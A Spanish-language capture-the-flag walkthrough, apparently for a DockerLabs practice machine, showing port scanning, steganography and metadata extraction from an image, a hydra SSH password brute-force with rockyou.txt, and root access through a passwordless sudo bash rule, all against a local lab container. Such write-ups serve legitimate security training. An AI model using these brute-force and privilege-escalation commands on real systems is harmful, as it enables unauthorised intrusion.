# Máquina Borazuwarahctf
- Dificultad: muy fácil

## Escaneo con nmap
<p>Realizamos un escaneo de puertos, servicios y versiones con el siguiente comando.</p>

```
nmap -sCV -sS -n -Pn -p- 172.17.0.2

```

```
Nmap scan report for 172.17.0.2
Host is up (0.000019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
|_  256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



```
<p>El servicio SSH está activo y el Apache está corriendo en el puerto 80, revisamos la página Web</p>

![captura-web](https://github.com/JavierKJ4/Dockerlabs/blob/main/recursos/Screenshot_2024-06-04_06_08_03.png)

<p>No encontramos nada con gobuster, asi que descargamos la imagen para probar esteganografía</p>

## Steghide

```
 steghide --extract -sf Untitled.jpeg

```

```
Enter passphrase: 
wrote extracted data to "secreto.txt".

```
<p>En la passphrase no escribimos nada y aparece un archivo "secreto.txt".</p>

```
cat secreto.txt

```

```
Sigue buscando, aquí no está to solución
aunque te dejo una pista....
sigue buscando en la imagen!!!

```
<p>Usamos exiftool para revisar los datos de la imagen.</p>


```
exiftool Untitled.jpeg

```

```
ExifTool Version Number         : 12.76
File Name                       : Untitled.jpeg
Directory                       : ../../..
File Size                       : 19 kB
File Modification Date/Time     : 2024:06:02 08:06:39-05:00
File Access Date/Time           : 2024:06:02 08:06:39-05:00
File Inode Change Date/Time     : 2024:06:02 08:06:39-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password:  ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207


```
<p>En la parte de descripción encontramos un usuario asi que probamos fuerza bruta al SSH con ese usuario.</p>

##Hydra

```
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt  ssh://172.17.0.2

```

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-04 05:56:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
1 of 1 target successfully completed, 1 valid password found

```
<p>Ahora con el las credenciales borazuwarah:123456 nos conectamos por SSH.</p>

##SSH

```
ssh 172.17.0.2 -l borazuwarah

```
<p>Nos pide la contraceña, la escribimos y estamos dentro.</p>

```
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:O4p1roi1VxgJcCkT8eG0qxAP8LkcGMNNNg1H/7HISvg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
borazuwarah@172.17.0.2's password: 
Linux 38a19ca784fd 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
borazuwarah@38a19ca784fd:~$

```
<p>Ejecutamos sudo -l para ver que podemos ejecutar como root</p>


```
borazuwarah@38a19ca784fd:~$ sudo -l

```

```
Matching Defaults entries for borazuwarah on 38a19ca784fd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User borazuwarah may run the following commands on 38a19ca784fd:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash

```

<p>Podemos ejecutar sin contrseña /bin/bash asi que lo ejecutamos y ya somos root.</p>

```
borazuwarah@38a19ca784fd:~$ sudo -u root /bin/bash

```

```
root@38a19ca784fd:/home/borazuwarah# whoami
root

```
